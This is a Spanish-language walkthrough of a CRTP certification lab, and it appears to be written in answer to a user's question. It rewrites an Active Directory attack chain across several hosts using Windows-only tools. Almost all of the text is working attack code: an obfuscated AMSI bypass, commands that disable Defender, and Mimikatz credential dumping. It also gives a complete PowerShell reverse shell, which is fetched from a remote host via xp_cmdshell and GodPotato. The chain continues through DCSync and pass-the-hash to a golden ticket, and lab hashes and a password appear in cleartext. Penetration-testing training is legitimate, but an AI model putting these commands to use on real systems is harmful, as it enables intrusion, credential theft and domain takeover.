# Pasos Reales del Informe CRTP + Pasos Intermedios No Documentados

### (Todo adaptado a Windows — sin herramientas de Kali/Linux)

---

## TARGET #0 — StudentVM (172.16.100.1)

**0. Ejecutar InviShell**

```PowerShell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

**1. AMSI Bypass**

```powershell
S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE](
"{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL
)."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}"-f
'.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}"-f 'ma','.','tion')),'s',(("{1}{0}"-f
't','Sys')+'em') ) )."g`etf`iElD"(( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f
'ni','tF')+("{1}{0}"-f'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}"-
f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

**2. (No documentado) Transferir SharpHound antes de poder ejecutar `Invoke-Bloodhound`** El informe muestra directamente la ejecución de `Invoke-Bloodhound`, pero ese cmdlet no existe hasta que se carga `SharpHound.ps1` en memoria:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://172.16.99.11:8000/SharpHound.ps1')
```

**3. Enumeración con SharpHound**

```powershell
Invoke-Bloodhound -CollectionMethod All -Stealth
o
.\SharpHound.exe -c All --Stealth
```

**4. (No documentado) Transferir WinPEAS antes de ejecutarlo** El informe dice "pudimos ejecutar WinPeas.exe" sin mostrar la descarga. En Windows, sin usar Kali, se hace así:

```powershell
Invoke-WebRequest -Uri http://172.16.99.11:8000/winPEASx64.exe -OutFile winpeas.exe
.\winpeas.exe
```

**5. Cargar PowerView (documentado)**

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://172.16.99.11:8000/powerview.ps1')
```

**6. Enumeración con PowerView (documentado)**

```powershell
Get-DomainUser | Select-Object SamAccountName, Description
Get-DomainComputer | Select-Object Name, DNSHostName
Get-DomainGroup | Select-Object Name, Description
```

**7. Cargar PowerUp (documentado)**

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://172.16.99.11:8000/PowerUp.ps1'); 
Invoke-Modules .\PowerUp.ps1
Invoke-AllChecks
```

**8. Explotar servicio VDS mal configurado (documentado)**

```powershell
Invoke-ServiceAbuse –Name 'vds' -Username 'test\studentuser'
```

**9. Verificación de pertenencia al grupo Administrators (documentado)**

```powershell
net localgroup Administrators
```

**10. Desactivar Antivirus (documentado)**

```powershell
Set-MPPreference -DisableRealTimeMonitoring $true
Set-MPPreference -DisableIOAVProtection $true
```

**11. (No documentado) Transferir Mimikatz** El informe dice "Now Mimikatz could be installed" sin mostrar cómo llegó al disco. Paso necesario:

```powershell
Invoke-WebRequest -Uri http://172.16.99.11:8000/mimikatz.exe -OutFile mimikatz.exe
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

(en el informe se indica que la SAM local no dio ninguna credencial útil).

**12. Identificar delegación T2A4D (documentado)**

```powershell
Get-DomainComputer -TrustedToAuth
```

→ Revela que `STUDVM$` tiene `Trusted To Auth For Delegation` hacia `CIFS/mgmtsrv`.

**13. (No documentado) Obtener el hash NTLM de la cuenta de máquina STUDVM$** Para poder usar Rubeus con `/rc4:` se necesita antes el hash de `STUDVM$`, que Mimikatz ya extrajo en el paso 11 junto al resto de credenciales en `sekurlsa::logonpasswords` (la cuenta de máquina aparece como `STUDVM$`).

**14. Abuso de S4U con Rubeus (documentado)**

```powershell
.\Rubeus.exe s4u /user:STUDVM$ /rc4:55fc07b7eb99af622f1bae22c94965e9 /impersonateuser:Administrator /msdsspn:CIFS/mgmtsrv.tech.finance.corp /ptt
```

**15. Verificación de acceso (documentado)**

```powershell
dir \\mgmtsrv.tech.finance.corp\C$
```

---

## TARGET #1 — MgmtSrv (172.16.5.156)

**16. Segundo ticket S4U con servicio HTTP para WinRM (documentado)**

```powershell
.\Rubeus.exe s4u /user:STUDVM$ /rc4:55fc07b7eb99af622f1bae22c94965e9 /impersonateuser:Administrator /msdsspn:CIFS/mgmtsrv.tech.finance.corp /altservice:HTTP /ptt
```

**17. Conexión remota vía WinRM (documentado)**

```powershell
winrs -r:mgmtsrv.tech.finance.corp cmd
```

**18. Intento de crear usuario local y habilitar RDP (documentado — falló)**

```powershell
net user UrielCRTP ExamenTest@2024 /add
net localgroup Administrator UrielCRTP /add
net localgroup "Remote Desktop Users" UrielCRTP /add
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

(No funcionó, según el propio informe.)

**19. (No documentado) Volver a desactivar Defender en esta nueva máquina/sesión** Cada host nuevo requiere repetir el paso, aunque el informe no lo repite explícitamente:

```powershell
Set-MPPreference -DisableRealTimeMonitoring $true
Set-MPPreference -DisableIOAVProtection $true
```

**20. (No documentado) Transferir Mimikatz a MgmtSrv**

```powershell
Invoke-WebRequest -Uri http://172.16.99.11:8000/mimikatz.exe -OutFile mimikatz.exe
```

**21. Extracción del hash NTLM de `techservice` (documentado)**

```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

**22. Petición e inyección de TGT con el hash de techservice (documentado)**

```powershell
.\Rubeus.exe asktgt /user:techservice /rc4:ac25af07540962863d18c6f924ee8ff3 /ptt
```

**23. Conexión remota a TECHSRV30 (documentado)**

```powershell
winrs -r:techsrv30 powershell
```

---

## TARGET #2 — TechSrv30 (172.16.6.30)

**24. (No documentado) Desactivar Defender de nuevo en este host**

```powershell
Set-MPPreference -DisableRealTimeMonitoring $true
Set-MPPreference -DisableIOAVProtection $true
```

**25. Descarga y ejecución de WinPEAS (documentado, con comando explícito esta vez)**

```powershell
iwr –uri http://172.16.99.11:8000/winPEASx64.exe -Outfile winpeas.exe
.\winpeas.exe
```

**26. Identificación de la tarea programada "PingDatabase" (documentado)**

```powershell
schtasks /query /fo LIST /v
```

→ Revela `Run As User: databaseagent` ejecutando `cmd.exe ping -n 1 dbserver31`.

**27. (No documentado — el punto que preguntabas) Transferir Mimikatz a la máquina TechSrv30 (contexto techservice)** Aquí es donde realmente se necesitó copiar Mimikatz a esta máquina para poder extraer las credenciales guardadas en el vault de la tarea programada. Sin Kali, en PowerShell puro:

```powershell
Invoke-WebRequest -Uri http://172.16.99.11:8000/mimikatz.exe -OutFile C:\Users\techservice\mimikatz.exe
cd C:\Users\techservice
```

**28. Extracción de credenciales del vault con Mimikatz (documentado)**

```powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "vault::cred /patch" "exit"
```

→ Se obtiene: `TECH\databaseagent` / `CheckforSQLServer31-Availability`.

**29. Conexión a MSSQL — sustituyendo `impacket-mssqlclient` (Kali) por el equivalente en Windows** En el informe se usó `impacket-mssqlclient` desde Linux. La forma nativa en Windows es con `sqlcmd.exe` (incluido en SQL Server Client Tools) o el módulo `SqlServer` de PowerShell. Como la sesión actual ya corre como `techservice` y no como `databaseagent`, primero hay que suplantar la cuenta:

```powershell
runas /netonly /user:tech.finance.corp\databaseagent cmd
```

(introduce la contraseña obtenida en el paso 28)

Y desde esa nueva consola, conectar con `sqlcmd`:

```powershell
sqlcmd -S 172.16.6.31 -E
```

Si `sqlcmd.exe` no está disponible en el host, alternativa en PowerShell puro con .NET (sin instalar nada):

```powershell
$conn = New-Object System.Data.SqlClient.SqlConnection("Server=172.16.6.31;Integrated Security=True;")
$conn.Open()
$cmd = $conn.CreateCommand()
$cmd.CommandText = "SELECT @@version"
$cmd.ExecuteReader()
```

---

## TARGET #3 — DbServer31 (172.16.6.31)

**30. Habilitar xp_cmdshell (documentado, en SQL puro — ya es "Windows-native" porque se ejecuta dentro de la sesión SQL)**

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

**31. (No documentado) Crear el payload rev.ps1 y alojarlo para descarga** El informe menciona que "rev.ps1 fue creado" sin mostrar el contenido. Un ejemplo típico de reverse shell en PowerShell:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('IP_ATACANTE',4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

Este archivo se sirve igualmente desde el servidor HTTP (`python3 -m http.server 8000` en la máquina atacante — este paso sí se ejecuta fuera del entorno Windows objetivo, es el servidor de recursos, no cuenta como "paso en Kali contra el target").

**32. Preparar el listener antes de disparar el payload (documentado en concepto, aquí como se haría sin `nc` de Linux)** Sustituyendo Netcat (Kali) por una alternativa nativa de Windows como receptor, puedes usar **Ncat para Windows** (`ncat.exe`, viene con Nmap, es un binario Windows, no requiere Kali):

```powershell
ncat.exe -lvnp 4444
```

o, si se prefiere 100% PowerShell sin binarios externos, un listener básico:

```powershell
$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4444)
$listener.Start()
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true
while ($client.Connected) {
    if ($stream.DataAvailable) { Write-Host $reader.ReadLine() }
}
```

**33. Disparo del payload vía xp_cmdshell (documentado)**

```sql
EXEC xp_cmdshell 'powershell -c IEX(New-Object Net.WebClient).DownloadString(''http://172.16.99.11:8000/rev.ps1'')';
```

**34. Enumeración de privilegios en la shell recibida (documentado)**

```cmd
whoami /all
```

→ `SeImpersonatePrivilege: Enabled`

**35. (No documentado) Transferir GodPotato al host comprometido** El informe indica que "GodPotato fue alojado en un servidor HTTP", pero falta el comando de descarga en el objetivo:

```powershell
Invoke-WebRequest -Uri http://172.16.99.11:8000/GodPotato-NET35.exe -OutFile GodPotato-NET35.exe
```

**36. Ejecución de GodPotato para escalar a SYSTEM (documentado)**

```cmd
GodPotato-NET35.exe -cmd "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://172.16.99.11:8000/rev.ps1')"
```

**37. Confirmación de shell como SYSTEM (documentado)**

```cmd
whoami
```

→ `nt authority\system`

---

## TARGET #4 — Tech-DC (172.16.4.1)

**38. (No documentado) Repetir transferencia de Mimikatz en este contexto SYSTEM de DbServer31** Ya deberías tener `mimikatz.exe` en el disco de este mismo host desde antes (mismo servidor DbServer31, ya con SYSTEM); si no, repetir descarga:

```powershell
Invoke-WebRequest -Uri http://172.16.99.11:8000/mimikatz.exe -OutFile mimikatz.exe
```

**39. Extracción de credenciales de `sqlserversync` (documentado)**

```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

**40. Confirmar en BloodHound que `sqlserversync` tiene permisos DCSync (documentado, conceptualmente — visto en la interfaz gráfica)**

**41. DCSync — sustituyendo `impacket-secretsdump` (Kali) por el equivalente nativo en Windows con Mimikatz**

```powershell
.\mimikatz.exe "lsadump::dcsync /domain:tech.finance.corp /user:Administrator" "exit"
```

(Esto reemplaza directamente al `impacket-secretsdump tech/sqlserversync@172.16.4.1 -hashes ...` del informe, sin salir de Windows.)

**42. Pass-the-hash — sustituyendo `nxc smb ... -H <hash>` (Kali) por el equivalente en Windows con Mimikatz**

```powershell
.\mimikatz.exe "sekurlsa::pth /user:Administrator /domain:tech.finance.corp /ntlm:acfd00282fbe922483c12e049e6e8990 /run:cmd.exe"
```

Esto abre una nueva consola con el token de Administrator inyectado. Desde ahí, en vez de `nxc smb`, se verifica el acceso así:

```cmd
dir \\172.16.4.1\C$
```

---

## TARGET #5 — Finance-DC (172.16.3.1)

**43. Obtener el SID de tech.finance.corp — sustituyendo `nxc ldap ... --get-sid` (Kali) por PowerView (Windows)**

```powershell
Get-DomainSID -Domain tech.finance.corp
```

**44. Obtener el SID de finance.corp (documentado, ya nativo en PowerShell)**

```powershell
Get-DomainSID -domain finance.corp
```

**45. (No documentado) Obtener el hash de krbtgt de tech.finance.corp** Necesario para forjar el Golden Ticket; se obtiene del mismo volcado DCSync del paso 41, pidiendo específicamente la cuenta `krbtgt`:

```powershell
.\mimikatz.exe "lsadump::dcsync /domain:tech.finance.corp /user:krbtgt" "exit"
```

**46. Forjar el Golden Ticket con SID History (documentado)**

```powershell
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:tech.finance.corp /sid:S-1-5-21-1325336202-3661212667-302732393 /sids:S-1-5-21-1712611810-3596029332-2671080496-519 /krbtgt:09227267ba7e2fff1aac786a7cd08294 /ticket:finance.kirbi" "exit"
```

**47. Inyección del ticket (documentado)**

```powershell
.\mimikatz.exe "kerberos::ptt finance.kirbi" "exit"
```

**48. Creación y ejecución de tarea programada remota con SYSTEM (documentado)**

```powershell
schtasks /create /S finance-dc.finance.corp /SC Weekly /RU "NT Authority\SYSTEM" /TN "UrielCRTP" /TR "powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://172.16.99.11:8000/rev.ps1')"
schtasks /Run /S finance-dc.finance.corp /TN "UrielCRTP"
```

**49. Confirmación final de shell SYSTEM en el segundo dominio (documentado)**

```cmd
whoami
```

→ `nt authority\system`

---

## Resumen de las sustituciones Kali → Windows realizadas

|Paso del informe (Kali/Linux)|Reemplazo nativo Windows|
|---|---|
|`impacket-mssqlclient`|`sqlcmd.exe` con `runas /netonly`, o `System.Data.SqlClient` en PowerShell|
|`impacket-secretsdump` (DCSync)|`mimikatz "lsadump::dcsync"`|
|`nxc smb -H <hash>` (pass-the-hash)|`mimikatz "sekurlsa::pth"` + `dir \\host\C$`|
|`nxc ldap --get-sid`|PowerView `Get-DomainSID`|
|`rlwrap nc -nvlp` (listener)|`ncat.exe` (binario Windows) o listener TCP en PowerShell puro|

## Resumen de pasos "faltantes" añadidos (transferencias de herramientas no documentadas)

1. Descarga de `SharpHound.ps1` antes de `Invoke-Bloodhound` (StudentVM).
2. Descarga de `winPEASx64.exe` antes de la primera ejecución (StudentVM).
3. Descarga de `mimikatz.exe` en StudentVM (antes del paso "Now Mimikatz could be installed").
4. Descarga de `mimikatz.exe` en MgmtSrv (antes de extraer el hash de techservice).
5. Descarga de `mimikatz.exe` en TechSrv30 — **este es el paso que preguntabas**, necesario antes de `vault::cred /patch`.
6. Creación/alojamiento del contenido real de `rev.ps1`.
7. Descarga de `GodPotato-NET35.exe` en DbServer31.
8. Reutilización/transferencia de `mimikatz.exe` en Tech-DC para el DCSync final.
9. Obtención explícita del hash de `krbtgt` (no solo del Administrator) antes de forjar el Golden Ticket.